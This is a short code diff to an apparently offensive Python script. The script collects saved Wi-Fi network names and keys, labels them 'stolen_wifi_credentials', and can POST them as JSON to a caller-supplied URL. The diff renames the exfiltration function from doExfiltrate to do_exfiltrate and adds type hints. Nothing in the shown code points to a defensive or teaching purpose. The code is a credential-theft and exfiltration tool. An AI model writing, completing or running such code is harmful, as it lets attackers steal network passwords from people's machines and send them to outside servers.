@@ -16,7 +16,7 @@ def find_wifi_credentials() -> typing.List[typing.Dict[str,str]]:
     return ssid_key
 
 
-def doExfiltrate(url:str,data:typing.List[typing.Dict[str,str]]) -> None:
+def do_exfiltrate(url:str,data:typing.List[typing.Dict[str,str]]) -> None:
     try:
         requests.post(url,json=json.dumps(data),timeout=2.50)
     except:
@@ -24,9 +24,10 @@ def doExfiltrate(url:str,data:typing.List[typing.Dict[str,str]]) -> None:
 
 
 def main(*,exfiltrate:bool=False,url:str="") -> None:
-    stolen_wifi_credentials = find_wifi_credentials()
+    stolen_wifi_credentials:typing.List[typing.Dict[str,str]] = find_wifi_credentials()
+
     if(exfiltrate):
-        doExfiltrate(url,stolen_wifi_credentials)
+        do_exfiltrate(url,stolen_wifi_credentials)
         return
     print(stolen_wifi_credentials)
 
